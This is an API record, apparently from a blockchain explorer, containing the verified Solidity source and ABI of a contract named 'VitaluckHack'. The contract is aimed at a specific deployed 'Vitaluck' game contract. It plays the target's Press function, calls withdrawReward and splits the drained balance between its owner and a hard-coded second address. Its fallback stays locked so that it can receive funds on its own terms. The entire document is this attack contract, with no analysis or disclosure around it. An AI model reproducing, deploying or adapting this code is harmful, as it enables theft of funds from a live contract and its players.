{"status":"1","message":"OK","result":[{"SourceCode":"contract VitaluckHack{\r\n    \r\n    bool locked = true;\r\n    address owner = msg.sender;\r\n    \r\n    function()\r\n        public payable \r\n    { \r\n        if (locked){\r\n            revert();\r\n        }\r\n    }\r\n    \r\n    function setlock(bool what){\r\n        require(msg.sender == owner);\r\n        locked = what;\r\n    }\r\n    \r\n    function go() public payable {\r\n        Vitaluck Target = Vitaluck(0xB36A7CD3f5d3e09045D765b661aF575e3b5AF24A);\r\n        \r\n        Target.Press.value(msg.value)(1, 0);\r\n    }\r\n    \r\n    function get(){\r\n        setlock(false);\r\n        Vitaluck Target = Vitaluck(0xB36A7CD3f5d3e09045D765b661aF575e3b5AF24A);\r\n        Target.withdrawReward();\r\n        \r\n        address(0x98081ce968E5643c15de9C024dE96b18BE8e5aCe).transfer(address(this).balance/2);\r\n        address(owner).transfer(address(this).balance);\r\n    }\r\n    \r\n    \r\n    \r\n}\r\n\r\ninterface Vitaluck{\r\n    function withdrawReward() public;\r\n    function Press(uint a, uint b) public payable;\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"go\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"get\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"what\",\"type\":\"bool\"}],\"name\":\"setlock\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"VitaluckHack","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://f8f47cc21c0347dabd4e4b5ef1dcbbf2a3b83490edc8a895020eb76986e5a600"}]}